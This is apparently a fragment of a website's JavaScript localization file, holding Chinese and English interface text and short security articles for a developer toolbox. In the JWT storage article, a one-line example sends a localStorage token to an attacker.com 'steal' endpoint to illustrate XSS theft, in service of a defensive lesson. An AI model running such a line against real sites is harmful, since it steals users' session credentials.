      'tool_card3_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">fingerprint</span> 3. 单向散列 (MD5 vs SHA-256 vs Argon2)</h3><p>密码学哈希具备雪崩效应与不可逆性。MD5 与 SHA-1 已被证实存在碰撞漏洞：</p><ul><li><strong>数据完整性校验</strong>：推荐使用 <strong>SHA-256</strong> 与 <strong>SHA-512</strong>。</li><li><strong>用户密码落库存储</strong>：绝不能使用普通的快哈希（MD5/SHA256），必须使用针对 GPU 爆破优化的慢哈希算法：<strong>Argon2id、bcrypt 或 PBKDF2</strong> 并配合动态加盐（Salt）。</li></ul>',
      'tool_card4_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">schedule</span> 4. Unix 时间戳与 2038 年危机 (Y2K38)</h3><p>Unix 时间戳从 <code>1970-01-01 00:00:00 UTC</code> 开始计时：</p><ul><li>在传统的 <strong>32 位有符号整数</strong>系统中，最大表示值为 <code>2,147,483,647</code> 秒；</li><li>将在 <strong>2038 年 1 月 19 日 03:14:07 UTC</strong> 发生整型溢出回滚至 1901 年；</li><li>现代 64 位体系已彻底解决该问题，可支持长达 2920 亿年的时间跨度。</li></ul>',

      // AI 对话
      'ai_title': 'AI 智能助手',
      'ai_subtitle': '与 Gemini 智能核心进行深度实时对话。所有交互皆在本地建立连接。',
      'ai_model_label': 'AI 模型:',
      'ai_welcome': '你好，Operator。我是 825412.xyz 的智能助手。请在设置中配置你的 Gemini API Key 以启用深度神经网络对话链路。配置完成后，你可以随时向我提问！',
      'ai_input_ph': '输入您的问题，按回车发送...',

      // 设置模态框
      'set_title': '设置中心',
      'set_alert': '密钥安全提示：所有 API Key 均以加密形式仅储存在您的浏览器本地 (LocalStorage) 中，绝不会上传给任何第三方。',
      'set_key_label': 'Gemini API Key',
      'set_key_ph': '输入你的 Gemini API 密钥',
      'set_cancel': '取消',
      'set_save': '保存配置',

      // 阅读贴纸模态框
      'read_modal_title': '收到分享的剪贴板内容',
      'read_meta_label': '分享内容：',
      'read_copy_btn': '一键复制',
      'read_close_btn': '关闭',

      // 服务条款模态框
      'terms_modal_title': '服务条款 (Terms of Service)',
      'terms_dismiss': '我已阅读并同意',

      // Cookie 同意横幅
      'cookie_text': '本站使用 Cookie 及本地存储以提升极客工具体验、分析流量并展示个性化广告。继续使用即表示您同意我们的《隐私政策》与《服务条款》。',
      'cookie_accept': '同意并继续',
      'cookie_learn': '查看详情',

      // 页脚
      'footer_rights': '© 2026 825412.xyz 极客多功能工具箱 | 保留所有权利'
    },
    'en-US': {

      "dash_shortcut_screen": "Dead Pixel Test",
      "dash_shortcut_kb": "Keyboard Test",
      "dash_shortcut_mouse": "Mouse & Hz Test",


      "tool_screen_title": "Online Monitor Display Dead Pixel & Ghosting Quality Tester",
      "tool_screen_sub": "Essential for new monitor inspection: Fullscreen pure-color dead pixel check, IPS backlight bleed diagnostics, 256-level grayscale dynamic range, and high-refresh ghosting test.",
      "screen_mode1_title": "1. Solid Color Dead / Hot Pixel Check",
      "screen_mode1_desc": "Cycle through full screen black, white, red, green, blue, cyan, magenta, and yellow to spot dead pixels.",
      "screen_btn_start_solid": "Start Dead Pixel Test (Fullscreen)",
      "screen_mode2_title": "2. 256-Level Grayscale & Ramp Test",
      "screen_mode2_desc": "Evaluate display panel color banding, shadow detail, and contrast transitions.",
      "screen_btn_start_grad": "Start Grayscale Ramp Test",
      "screen_mode3_title": "3. High-Refresh Motion Ghosting",
      "screen_mode3_desc": "Render fast-moving color blocks to visually check pixel response time and motion blur.",
      "screen_btn_start_ghost": "Start Motion Ghosting Test",
      "screen_tip_title": "Instructions:",
      "screen_tip_text": "Once in fullscreen, left click or press [Space] / [Arrow keys] to cycle test patterns. Press [ESC] to exit.",
      "tool_screen_doc_title": "Monitor Panel Architectures (IPS / OLED / Mini-LED) & ISO 9241 Defect Standards",
      "tool_screen_doc_sub": "Understand liquid crystal alignments, backlight glow mechanics, GtG vs MPRT response times, and warranty replacement criteria.",
      "tool_screen_doc_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">tv</span> 1. Pixel Defect Standards (ISO 9241-307 Class II)</h3>
        <p>The ISO standard classifies pixel defects into three distinct categories:</p>
        <ul>
          <li><strong>Hot / Stuck Pixel</strong>: Pixels that remain illuminated on a pure black background due to shorted subpixel transistors;</li>
          <li><strong>Dead Pixel</strong>: Completely unlit black dots on a pure white or solid background caused by broken drive circuits;</li>
          <li><strong>Industry Replacement Thresholds</strong>: Class II panels typically allow no more than 2 hot pixels or 5 dead pixels. Perfect panel gaming displays guarantee zero hot pixels.</li>
        </ul>
        <h3><span class="material-symbols-outlined" style="font-size: 18px;">speed</span> 2. GtG Response Times vs MPRT Motion Clarity</h3>
        <p>1ms specs frequently reference MPRT black frame insertion rather than physical gray-to-gray (GtG) transition speeds. Slower GtG results in severe motion blur (ghosting / smearing) during fast camera rotations.</p>`,

      "tool_kb_title": "Mechanical Keyboard Ghosting & Key Chatter Online Tester",
      "tool_kb_sub": "Real-time key illumination for standard 87/104 layouts, N-Key Rollover (NKRO) concurrency counter, and mechanical switch chattering diagnostics.",
      "kb_stat_tested": "Keys Tested:",
      "kb_stat_nkro": "Max Concurrency:",
      "kb_stat_chatter": "Chatters / Faults:",
      "kb_legend_tested": "Green: Passed test",
      "kb_legend_pressing": "Cyan: Currently pressed",
      "kb_legend_chatter": "Red: Hardware double-click/chatter detected",
      "tool_kb_doc_title": "Keyboard Anti-Ghosting Diode Matrices & Microcontroller Debounce Algorithms",
      "tool_kb_doc_sub": "Deep dive into N-Key Rollover diode circuitry, USB HID report descriptors, and mechanical switch oxidation chattering.",
      "tool_kb_doc_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">keyboard</span> 1. Why Do Membrane Keyboards Suffer From Ghosting?</h3>
        <p>Membrane keyboards use simple row-column scanning matrices. Pressing 3 keys forming a rectangle vertex causes parasitic current backflow triggering a false 4th key (ghosting). Mechanical keyboards integrate a dedicated diode per switch, physically isolating current flow to achieve true N-Key Rollover (NKRO).</p>
        <h3><span class="material-symbols-outlined" style="font-size: 18px;">timer</span> 2. Mechanical Switch Chattering Mechanics</h3>
        <p>As internal metal contacts oxidize and collect dust, closing contacts experience mechanical vibrations (bouncing). If the microcontroller debounce window is tuned too aggressively (<10ms), bouncing spikes register as unintended double presses.</p>`,

      "tool_mouse_title": "Mouse Microswitch Double-Click & Polling Rate (Hz) Tester",
      "tool_mouse_sub": "Millisecond-level double-click switch fault detection, real-time USB polling rate monitoring (125Hz-8000Hz), and scroll wheel smoothness analysis.",
      "mouse_card1_title": "1. Microswitch Double-Click Fault Detection",
      "mouse_pad_hint": "Rapidly click within this box (Left / Right / Middle click)",
      "mouse_pad_sub": "Anomalous clicks under 80ms interval trigger a double-click hardware fault warning",
      "mouse_btn_left": "Left Clicks:",
      "mouse_btn_right": "Right Clicks:",
      "mouse_fault_count": "Double Faults:",
      "mouse_card2_title": "2. Real-Time Mouse Polling Rate (Hz) Speedometer",
      "mouse_hz_hint": "Continuously move your mouse in fast circles within this area",
      "mouse_hz_sub": "Captures mousemove event intervals to compute USB polling frequency",
      "mouse_curr_hz": "Current Rate:",
      "mouse_peak_hz": "Peak Rate:",
      "tool_mouse_doc_title": "Mouse Microswitch Contact Oxidation & USB Polling Rate Engineering",
      "tool_mouse_doc_sub": "Why metal leaf microswitches degrade, optical switch advantages, and 1000Hz-8000Hz ultra-high polling rate impacts on CPU load and frame pacing.",
      "tool_mouse_doc_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">mouse</span> 1. Anatomy of Mechanical Microswitch Double-Clicking</h3>
        <p>Traditional mechanical switches (Omron, TTC Gold) rely on metal leaf springs for electrical contact. Over time, contact surfaces suffer arc burn and oxidation, elevating impedance and introducing electrical noise that triggers false double clicks. Optical switches use infrared beams, completely eliminating physical contact wear.</p>
        <h3><span class="material-symbols-outlined" style="font-size: 18px;">speed</span> 2. 1000Hz vs 4000Hz/8000Hz Ultra-High Polling Rates</h3>
        <p>Polling rate defines how frequently the mouse reports position data to the OS (1000Hz = 1ms interval; 8000Hz = 0.125ms interval). Ultra-high polling eliminates cursor micro-stuttering on 240Hz+ gaming monitors at the cost of higher CPU interrupt overhead.</p>`,


      "dash_pub_title": "Developer Technical Publications & Whitepapers",
      "dash_pub_sub": "Deep-dive engineering guides on network architectures, cryptographic security, and computer graphics by the 825412.xyz team.",
      "dash_pub_card1_title": "WebRTC P2P Protocol & NAT Traversal Whitepaper ➔",
      "dash_pub_card1_desc": "In-depth breakdown of browser P2P connection mechanics: STUN probing, ICE candidate gathering, SDP handshakes, and DTLS chunked streaming.",
      "dash_pub_card2_title": "Production Webhook Security & Idempotency Rules ➔",
      "dash_pub_card2_desc": "Master reverse HTTP callbacks, HMAC-SHA256 signature verification, anti-replay timing windows, and distributed lock idempotency.",
      "dash_pub_card3_title": "Password Security: Shannon Entropy & NIST 800-63B ➔",
      "dash_pub_card3_desc": "Derivation of password entropy formula E = L × log2(N), 8x RTX 4090 cracking benchmarks, and why length always trumps complexity.",
      "dash_pub_card4_title": "Web Security: Why Never Store JWTs in LocalStorage ➔",
      "dash_pub_card4_desc": "Detailed analysis of XSS token theft vectors: Comparing LocalStorage risks against multi-layered HttpOnly SameSite cookie defenses.",
      "dash_pub_card5_title": "Evolution of Hash Functions: MD5 to Argon2 Hashing ➔",
      "dash_pub_card5_desc": "History of cryptographic hashes: MD5 collision proofs, SHA-256 internal structure, and memory-hard Argon2id/bcrypt password storage.",
      "dash_pub_card6_title": "Client-Side Image Processing & EXIF Privacy Stripping ➔",
      "dash_pub_card6_desc": "Pure browser-based Canvas GPU-accelerated image compression and privacy sanitization: Removing GPS geolocation coordinates in client memory.",
      "sitemap_title": "Site Map & Technical Directory (HTML Sitemap)",
      "sitemap_sub": "Explore 20+ standalone developer tools, RFC/NIST standard whitepapers, interactive APIs, and legal policies on 825412.xyz.",
      "sitemap_sec1_title": "Developer Tool Landing Pages",
      "sitemap_sec2_title": "Core Applications & Hubs",
      "sitemap_sec3_title": "Technical Whitepapers & Articles",
      "sitemap_sec4_title": "Legal & Engineering Team",
      "sitemap_t1": "🔐 Strong Password Generator & NIST Entropy ➔",
      "sitemap_t2": "📋 JSON Validator & Formatter (RFC 8259) ➔",
      "sitemap_t3": "🔑 JWT Debugger & Token Inspector (RFC 7519) ➔",
      "sitemap_t4": "⚡ MD5 / SHA-256 / SHA-512 Hash Calculator ➔",
      "sitemap_t5": "⏰ Unix Timestamp & Date Converter (Epoch) ➔",
      "sitemap_t6": "📝 Text Utilities & Base64 / URL Encoders ➔",
      "sitemap_t7": "🖼️ Image Compressor & EXIF GPS Scrubber ➔",
      "sitemap_t8": "📶 WiFi Direct QR Code Generator ➔",
      "sitemap_a1": "💻 825412.xyz Console & NOC Realtime Dashboard ➔",
      "sitemap_a2": "📡 WebRTC P2P AirDrop Instant File Transfer ➔",
      "sitemap_a3": "🧪 Webhook Echo Inspector & API Debugger ➔",
      "sitemap_a4": "📋 E2E Encrypted Anonymous Pastebin ➔",
      "sitemap_a5": "🧰 Developer Toolbox Main Portal ➔",
      "sitemap_art1": "📖 WebRTC P2P Protocol & NAT Traversal Whitepaper ➔",
      "sitemap_art2": "📖 Production Webhook Security & Idempotency Rules ➔",
      "sitemap_art3": "📖 Password Security: Shannon Entropy & NIST 800-63B ➔",
      "sitemap_art4": "📖 Web Security: Why Never Store JWTs in LocalStorage ➔",
      "sitemap_art5": "📖 Evolution of Hash Functions: MD5 to Argon2 Hashing ➔",
      "sitemap_art6": "📖 Client-Side Image Processing & EXIF Privacy Stripping ➔",
      "sitemap_l1": "🏢 About 825412.xyz & Engineering Statement ➔",
      "sitemap_l2": "🛡️ Privacy Policy (GDPR / CCPA Compliant) ➔",
      "sitemap_l3": "📜 Terms of Service & Acceptable Use ➔",
      "sitemap_l4": "✉️ Contact Us & Technical Support ➔",


      "tool_card_json_doc_title": "JSON Specification (RFC 8259) & Microservices Serialization",
      "tool_card_json_doc_sub": "Master JSON abstract syntax tree (AST) parsing, 64-bit integer overflow, and high-throughput serialization.",
      "tool_card_json_doc_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">terminal</span> 1. JavaScript 64-Bit Float Precision Loss on 19-Digit Snowflake IDs</h3>
        <p>In web application engineering, a common critical bug stems from backend 64-bit Snowflake Long IDs (e.g. <code>1787219372183921823</code>):</p>
        <ul>
          <li><strong>Root Cause</strong>: In JavaScript, all <code>Number</code> types are IEEE 754 double-precision floats with <code>Number.MAX_SAFE_INTEGER</code> equal to 2<sup>53</sup> - 1 (<code>9007199254740991</code>, ~16 digits);</li>
          <li><strong>Disaster Impact</strong>: When receiving >16 digit Long integers, <code>JSON.parse()</code> silently rounds trailing digits (e.g. <code>...823</code> becomes <code>...800</code>), corrupting records;</li>
          <li><strong>Industry Best Practice</strong>: Backends MUST serialize 64-bit IDs explicitly as <strong>String formats</strong> (e.g. Jackson <code>@JsonSerialize(using = ToStringSerializer.class)</code> or Go <code>json:",string"</code>).</li>
        </ul>`,

      "tool_card_jwt_doc_title": "JWT Architecture & Production Defense Matrix (RFC 7519)",
      "tool_card_jwt_doc_sub": "Stateless token mechanics, None algorithm vulnerability prevention, and HttpOnly cookie models.",
      "tool_card_jwt_gold_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">security</span> 4 Golden Rules to Defend Against JWT Forgery</h3>
        <ul>
          <li><strong>Enforce Explicit Algorithm Whitelists</strong>: Validate against static server-side algorithm lists (e.g. <code>algorithms=['HS256']</code>), never trusting client Header declarations;</li>
          <li><strong>Maintain >=256-Bit Secret Keys</strong>: Generate symmetric keys with cryptographic random generators (<code>openssl rand -base64 32</code>);</li>
          <li><strong>Short TTL + Refresh Token Rotation</strong>: Keep Access Tokens at 15-30 mins TTL paired with database-backed revocable Refresh Tokens;</li>
          <li><strong>Strict XSS Defense</strong>: Never store JWTs in <code>localStorage</code>; use <code>HttpOnly; Secure; SameSite=Strict</code> cookies.</li>
        </ul>`,

      "tool_card_hash_doc_title": "Cryptographic Hash Principles & Memory-Hard Slow Hashing",
      "tool_card_hash_doc_sub": "Avalanche effects, collision resistance, and how Argon2id/bcrypt defeat GPU clusters.",

      "tool_card_time_doc_title": "System Time Architectures & The Year 2038 Problem (Y2K38)",
      "tool_card_time_doc_sub": "Unix epoch time standards, leap second handling, and 32-bit signed integer overflow mitigations.",

      "tool_card_text_doc_title": "Character Encodings & Base64 Mathematics (RFC 4648)",
      "tool_card_text_doc_sub": "Mapping 8-bit octet streams to 6-bit printable alphabets, padding '=' mechanics, and UTF-8.",
      "tool_card_text_b64_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">format_quote</span> Why Base64 Encoding Expands Data Volume by ~33%</h3>
        <p>Base64 divides every 3 8-bit bytes (24 bits) into 4 6-bit units (2<sup>6</sup> = 64 printable characters):</p>
        <ul>
          <li><strong>Volume Growth</strong>: 3 bytes of raw binary produce 4 bytes of encoded text, resulting in a ratio of <code>4 / 3 ≈ 1.333 (+33.3%)</code>;</li>
          <li><strong>Padding Character '='</strong>: Appended when data length is not divisible by 3 to satisfy 24-bit alignment;</li>
          <li><strong>URL Safe Base64</strong>: Replaces <code>+</code> with <code>-</code> and <code>/</code> with <code>_</code> to avoid URL parameter mangling.</li>
        </ul>`,

      "tool_card_media_doc_title": "Modern Image Compression (WebP/AVIF) & EXIF Privacy",
      "tool_card_media_doc_sub": "Discrete Cosine Transform (DCT), canvas rendering, and geolocation metadata leak prevention.",
      "tool_card_media_exif_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">warning</span> EXIF Metadata Privacy: Why Sanitizing Before Sharing is Critical</h3>
        <p>Smartphones write sensitive hardware and environmental metadata into image headers (EXIF) by default:</p>
        <ul>
          <li><strong>GPS Geolocation Coordinates</strong>: Precise within 1 meter, exposing home and work locations;</li>
          <li><strong>Timestamps & Camera Hardware IDs</strong>: Millisecond timestamps and IMEI/serial numbers allowing cross-site tracking;</li>
          <li><strong>Client-Side Defense</strong>: HTML5 <code>Canvas.drawImage()</code> draws raw pixel bitmaps, physically discarding all EXIF header blocks with zero data upload.</li>
        </ul>`,

      "tool_card_wifi_doc_title": "WiFi Alliance Easy Connect & WPA3 Handshake Security",
      "tool_card_wifi_doc_sub": "Standard WiFi QR URI grammar and Simultaneous Authentication of Equals (SAE) anti-cracking.",
      "tool_card_wifi_spec_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">qr_code_2</span> Standard WiFi QR URI Syntax Specification</h3>
        <p>Native iOS (11+) and Android (10+) camera scanners parse standard WiFi URI strings:</p>
        <pre class="code-block" style="background: #020617; padding: 12px; border-radius: var(--radius-sm); font-family: var(--font-mono); font-size: 13px; color: #38bdf8; overflow-x: auto;"><code>WIFI:S:MyHome_WiFi;T:WPA;P:P@ssw0rd1234;H:false;;</code></pre>
        <ul>
          <li><code>S:</code> Network SSID (Name);</li>
          <li><code>T:</code> Authentication type (<code>WPA</code>, <code>WEP</code>, or <code>nopass</code>);</li>
          <li><code>P:</code> Pre-shared wireless password;</li>
          <li><code>H:</code> Hidden SSID flag (<code>true</code> / <code>false</code>).</li>
        </ul>`,


      "nav_articles": "Tech Publications",
      "nav_sitemap": "Sitemap Index",
      "nav_sitemap_html": "HTML Sitemap",
      "footer_rights_articles": "© 2026 825412.xyz Geek Toolbox | Developer Technical Library",


      "art1_title": "WebRTC Peer-to-Peer Protocol & NAT Traversal Deep-Dive Whitepaper",
      "art1_sub": "Master browser-native P2P high-speed data transfer: From STUN servers, ICE candidate gathering, and SDP handshakes to DTLS/SCTP end-to-end encrypted pipelines.",
      "art1_body": `<h2>1. Why WebRTC is the Ultimate Decentralized Transfer Solution</h2>
      <p>In traditional HTTP/WebSocket client-server architectures, sending a 50MB file from User A to User B traverses a centralized path: <code>User A ➔ Cloud Storage ➔ User B</code>. This introduces major bandwidth costs, server CPU overhead, and critical data retention privacy risks.</p>
      <p><strong>WebRTC (Web Real-Time Communication)</strong> completely revolutionizes this paradigm: It enables modern web browsers to establish direct, peer-to-peer UDP/SCTP encrypted connections without intermediate relays or storage servers.</p>

      <h2>2. The 4-Step P2P Connection Lifecycle</h2>
      <ol>
        <li><strong>Signaling Phase</strong>: Devices broadcast presence via a lightweight websocket signaling hub and exchange Session Description Protocol (SDP) manifests;</li>
        <li><strong>STUN NAT Discovery & ICE Candidate Gathering</strong>: Browsers probe public STUN servers (e.g. Google STUN) to resolve reflex public IPs and private LAN endpoints;</li>
        <li><strong>P2P Hole Punching</strong>: Devices initiate dual-way UDP handshakes. If connected to the same local WiFi router, the connection automatically routes over local intranet at full gigabit hardware speed;</li>
        <li><strong>DTLS Key Negotiation & SCTP Streaming</strong>: The channel is secured with Datagram Transport Layer Security (DTLS) 128/256-bit encryption, streaming binary ArrayBuffer chunks at 64KB intervals directly between client memory heaps.</li>
      </ol>

      <h2>3. P2P Traversal Success Rates Across Network Topologies</h2>
      <div class="doc-table-wrapper" style="margin: 20px 0;">
        <table class="doc-table">
          <thead>
            <tr><th>Network Environment</th><th>NAT Topology</th><th>P2P Direct Success Rate</th><th>Latency Profile</th></tr>
          </thead>
          <tbody>
            <tr><td><strong>Same Local WiFi / Office LAN</strong></td><td>Full Cone / Restricted</td><td><span style="color:#10b981; font-weight:700;">100% (Direct Intranet)</span></td><td>&lt; 2ms (Gigabit Capable)</td></tr>
            <tr><td><strong>Home Broadband (Cross-City)</strong></td><td>Port Restricted Cone</td><td><span style="color:#10b981; font-weight:700;">&gt; 92% (STUN Hole Punch)</span></td><td>15ms ~ 40ms</td></tr>
            <tr><td><strong>Cellular 4G/5G Mobile Networks</strong></td><td>Symmetric NAT</td><td><span style="color:#f59e0b; font-weight:700;">~75%</span></td><td>30ms ~ 80ms</td></tr>
          </tbody>
        </table>
      </div>`,

      "art2_title": "Production-Grade Webhook Security Architecture & Idempotency Best Practices",
      "art2_sub": "Public HTTP callback endpoints are vulnerable to request forgery, timing attacks, and replaying. Here is the standard architecture used by Stripe, GitHub, and PayPal.",
      "art2_body": `<h2>1. Why Webhooks are 10x More Efficient Than HTTP Polling</h2>
      <p>In traditional polling, clients call <code>GET /orders/status</code> every 3 seconds. 99% of requests return "no change", wasting bandwidth and database pools. Webhooks use event-driven reverse HTTP pushes, firing only when an event occurs and cutting infrastructure load by over 90%.</p>

      <h2>2. The 5 Golden Security Rules for Webhook Consumers</h2>
      <ol>
        <li><strong>HMAC-SHA256 Signature Verification</strong>: Compute HMAC on the raw payload using your shared secret and compare using constant-time equality (e.g. <code>crypto.timingSafeEqual</code>) to prevent timing attacks;</li>
        <li><strong>Timestamp Anti-Replay Windows</strong>: Validate the <code>X-Timestamp</code> header and discard requests older than 300 seconds (5 minutes);</li>
        <li><strong>Distributed Idempotency Keys</strong>: Network retries cause duplicate deliveries. Store <code>event_id</code> in Redis locks or unique DB constraints;</li>
        <li><strong>Fast 200 OK with Async Queueing</strong>: Respond with 200 OK within 500ms and offload processing to background workers (RabbitMQ / Kafka / Celery);</li>
        <li><strong>IP Whitelisting & TLS 1.3 Enforcement</strong>: Restrict incoming traffic to known gateway IP CIDR ranges.</li>
      </ol>`,

      "art3_title": "Modern Password Security: Shannon Entropy & NIST SP 800-63B Guidelines",
      "art3_sub": "Why do legacy character complexity rules harm security? Discover how Shannon information entropy and length-first paradigms stop GPU cracking clusters.",
      "art3_body": `<h2>1. Mathematical Derivation of Shannon Password Entropy</h2>
      <p>Information entropy represents the average uncertainty required to guess a random string (measured in bits):</p>
      <pre class="code-block" style="background: #020617; padding: 12px; border-radius: var(--radius-sm); font-family: var(--font-mono); font-size: 14px; color: #38bdf8;"><code>E = L × log2(N)</code></pre>
      <ul>
        <li><code>L</code>: Password length in characters;</li>
        <li><code>N</code>: Character set pool size (94 possible printable characters).</li>
      </ul>
      <p>A 16-character full-pool random password yields <code>16 × log2(94) ≈ 104.8 Bits</code> of entropy. Even an 8-card RTX 4090 cluster computing 100 billion hashes/sec requires billions of years to brute-force.</p>

      <h2>2. Key Takeaways from NIST SP 800-63B</h2>
      <ol>
        <li><strong>Eliminate Periodic Expiry</strong>: Forcing password changes every 90 days causes predictable incremental mutations (e.g. <code>Spring2026! ➔ Summer2026!</code>);</li>
        <li><strong>Length Always Trumps Complexity</strong>: A 4-word passphrase (e.g. <code>correct-horse-battery-staple</code>, 28 chars) is thousands of times stronger than an 8-character complex string.</li>
      </ol>`,

      "art4_title": "Web Security: Why You Must Never Store JWTs in LocalStorage",
      "art4_sub": "Storing access tokens in window.localStorage leaves them defenseless against Cross-Site Scripting (XSS). Learn the gold-standard HttpOnly cookie defense model.",
      "art4_body": `<h2>1. The Fatal Flaw of LocalStorage: Full JavaScript Access</h2>
      <p>Any script executing in the document context (third-party trackers, compromised npm packages, unescaped user HTML) can steal credentials with a single line:</p>
      <pre class="code-block" style="background: #020617; padding: 12px; border-radius: var(--radius-sm); font-family: var(--font-mono); font-size: 13px; color: #f87171;"><code>fetch(https://attacker.com/steal?token= + localStorage.getItem(access_token));</code></pre>

      <h2>2. The Gold-Standard Architecture: Memory Tokens + HttpOnly Cookies</h2>
      <ul>
        <li><strong>Keep Access Tokens in JS Memory</strong>: Store the short-lived access token in memory variables (Redux / Pinia), which are erased when the tab closes;</li>
        <li><strong>Store Refresh Tokens in HttpOnly Cookies</strong>: Set <code>Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict</code>. The browser engine forbids JavaScript from accessing HttpOnly cookies, making XSS token theft impossible;</li>
        <li><strong>Silent Background Token Renewal</strong>: Silently exchange the HttpOnly cookie for a fresh in-memory access token right before expiration.</li>
      </ul>`,

      "art5_title": "Evolution of Hash Functions: From MD5 Collisions to Argon2 Memory-Hard Hashing",
      "art5_sub": "Why must you never store passwords with MD5 or fast SHA-256? Understand fast vs memory-hard hashes and modern enterprise password storage standards.",
      "art5_body": `<h2>1. Fast Hashes vs Slow Hashes</h2>
      <ul>
        <li><strong>Fast Hashes (SHA-256, BLAKE3)</strong>: Engineered for ultra-fast throughput (integrity checks, digital signatures). Modern GPU clusters compute tens of billions of SHA-256 hashes per second;</li>
        <li><strong>Slow Hashes (Argon2id, bcrypt, scrypt)</strong>: Engineered specifically for password storage with configurable memory costs to exhaust GPU VRAM and increase brute-force costs by millions of times.</li>
      </ul>

      <h2>2. The Modern Standard: Argon2id</h2>
      <p>Argon2 is the Password Hashing Competition (PHC) winner, combining Argon2d (side-channel resistance) and Argon2i (GPU attack resistance):</p>
      <pre class="code-block" style="background: #020617; padding: 12px; border-radius: var(--radius-sm); font-family: var(--font-mono); font-size: 13px; color: #10b981;"><code>$argon2id$v=19$m=65536,t=3,p=4$c29tZXNhbHQ$...</code></pre>`,

      "art6_title": "Client-Side Image Processing & Privacy: Canvas Algorithms & EXIF GPS Stripping",
      "art6_sub": "Achieve 100% serverless, zero-upload image compression. Explore HTML5 Canvas hardware acceleration and physical-level GPS metadata removal.",
      "art6_body": `<h2>1. The Problem with Server-Side Image Processing</h2>
      <p>Uploading multi-megabyte photos to cloud servers wastes network bandwidth and poses compliance and privacy liabilities for user photos.</p>

      <h2>2. The 4 Key Benefits of Client-Side Canvas Processing</h2>
      <ol>
        <li><strong>Zero Server Upload</strong>: Images load into client RAM (Blob / ArrayBuffer) and are discarded upon download, ensuring total data sovereignty;</li>
        <li><strong>GPU-Accelerated WebP Encoding</strong>: Modern browsers compress a 5MB JPEG to a 500KB WebP in under 200 milliseconds;</li>
        <li><strong>Automatic EXIF & GPS Stripping</strong>: <code>Canvas.drawImage()</code> draws raw pixel bitmaps, automatically dropping all EXIF GPS headers and camera identifiers;</li>
        <li><strong>Modern WebP / AVIF Output</strong>: Delivers 30%~50% smaller payloads at identical visual fidelity.</li>
      </ol>`,


      'clip_input_ph': '// Paste your text or code snippet here...',
      'tool_json_ph': 'Paste raw JSON payload to format or validate...',
      'tool_jwt_ph': 'Paste JWT string (header.payload.signature)...',
      'tool_hash_ph': 'Enter text or password to compute cryptographic hashes...',
      'tool_hash_compare_ph': 'Paste expected MD5/SHA256 hash here to auto-compare integrity...',
      'airdrop_room_ph': 'Enter or switch custom room code...',


      'pwd_strength_val': 'Military Grade (Highest)',
      'pwd_entropy_init': 'Entropy: 95.2 Bits',
      'pwd_crack_init': '~320 Million Yrs (RTX 4090)',
      'pwd_charset_init': '94 Possible Characters (N)',
      'pwd_nist_init': 'Compliant with NIST SP 800-63B',
      'hash_file_info_init': '📄 File Info',
      'hash_calc_status_init': '⚡ Calculated',
      'time_input_ts_ph': 'Enter 10-digit timestamp',
      'time_output_dt_ph': 'Result',


      'clip_opt_1h': 'Expires in 1 Hour',
      'clip_opt_24h': 'Expires in 24 Hours',
      'clip_opt_7d': 'Expires in 7 Days',
      'clip_create_btn': 'Generate Share Link',
      'clip_res_title': 'Share Result',
      'clip_res_link_label': 'Your Share Link (Click to copy):',
      'clip_history_title': 'Local History',
      'clip_doc_title': 'Pastebin Architecture & Privacy Guide',
      'clip_doc_sub': 'Learn about ephemeral encrypted storage, self-destruct timers, and zero user telemetry.',
      'clip_card1_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">share</span> 1. How Does the Anonymous Pastebin Work?</h3><p>Paste any source code, configs, SQL queries, or notes, select a TTL expiration window, and generate your share link. Recipients opening the hash link (e.g. <code>#paste=xxxx</code>) can inspect and copy the payload instantly without signing up.</p>',
      'clip_card2_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">timer_off</span> 2. Ephemeral Storage & Auto-Destruction</h3><p>We provide 1-hour, 24-hour, and 7-day auto-destruction policies. Once expired, objects are permanently erased from cache with zero server retention.</p>',


      'search_placeholder': 'Search commands...',
      'wifi_enc_wpa': 'WPA / WPA2 / WPA3 (Universal)',
      'wifi_enc_nopass': 'No Password (Open Hotspot)',
      'wifi_enc_wep': 'WEP (Legacy)',
      'webhook_kb_title': 'Webhook Event Architecture & Production Security',
      'webhook_kb_sub': 'Covers reverse HTTP callback patterns, HMAC-SHA256 signature verification, and idempotency.',


      // Modals & General
      'set_lang_label': 'System Language',
      'privacy_modal_title': 'Privacy Policy',
      'privacy_modal_body': '<p><strong>Effective Date: June 5, 2026</strong></p><p>825412.xyz ("we", "our", or "this portal") values user privacy and data security. This policy outlines how information is collected, processed, and shielded when using our services.</p><h3>1. Information Collection & Zero Cloud Storage</h3><p>We provide registration-free, client-side tools. We do not collect names, phone numbers, or identity information.</p><ul><li><strong>API Keys & Settings:</strong> Keys entered in Settings are saved solely in your browser LocalStorage and never sent to our servers.</li><li><strong>Clipboard Pastes:</strong> Ephemeral pastes are encrypted and destroyed upon expiration.</li></ul><h3>2. Cookies & Google AdSense Compliance</h3><p>We partner with Google AdSense for advertising:</p><ul><li>Third-party vendors (including Google) use cookies to serve personalized ads based on prior visits.</li><li>Google uses advertising cookies (including DART) to serve ads based on visits across the web.</li><li>Users may opt out of personalized ads via <a href="https://adssettings.google.com" target="_blank" style="color: var(--color-secondary);">Google Ad Settings</a>.</li></ul><h3>3. Server Logs & DDoS Defense</h3><p>Global CDN edge nodes (Cloudflare) record standard HTTP access logs for security audit and rate limiting purposes only.</p><h3>4. Policy Updates</h3><p>We reserve the right to revise this policy. Continued usage constitutes acceptance.</p><h3>5. Contact Us</h3><p>For inquiries, email: <code>leen8254@gmail.com</code>.</p>',
      'privacy_dismiss': 'Got it',
      'about_modal_title': 'About 825412.xyz',
